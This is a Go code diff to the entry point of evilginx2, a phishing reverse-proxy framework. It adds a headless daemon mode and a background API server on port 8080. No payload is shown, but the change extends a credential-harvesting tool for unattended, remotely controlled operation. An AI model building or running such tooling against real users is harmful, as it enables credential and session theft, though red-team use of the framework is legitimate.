@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
 	_log "log"
@@ -12,6 +13,8 @@ import (
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/internal/api"
+	"github.com/kgretzky/evilginx2/internal/storage"
 	"github.com/kgretzky/evilginx2/log"
 	"go.uber.org/zap"
 
@@ -22,6 +25,7 @@ var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
+var daemon_mode = flag.Bool("daemon", false, "Run in daemon mode without interactive terminal")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
 
@@ -173,11 +177,30 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
 
-	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+	storageDB, err := storage.NewBuntDBStorage(filepath.Join(*cfg_dir, "api.db"))
 	if err != nil {
-		log.Fatal("%v", err)
-		return
+		log.Error("failed to create storage: %v", err)
+		storageDB = nil
 	}
+	
+	log.Info("Starting API server on port 8080")
+	apiServer := api.NewServer(storageDB, nil, "8080", nil)
+	go func() {
+		ctx := context.Background()
+		if err := apiServer.Start(ctx); err != nil {
+			log.Error("API server failed: %v", err)
+		}
+	}()
 
-	t.DoWork()
+	if !*daemon_mode {
+		t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+		if err != nil {
+			log.Fatal("%v", err)
+			return
+		}
+		t.DoWork()
+	} else {
+		log.Info("Running in daemon mode - API server and proxy are active")
+		select {}
+	}
 }
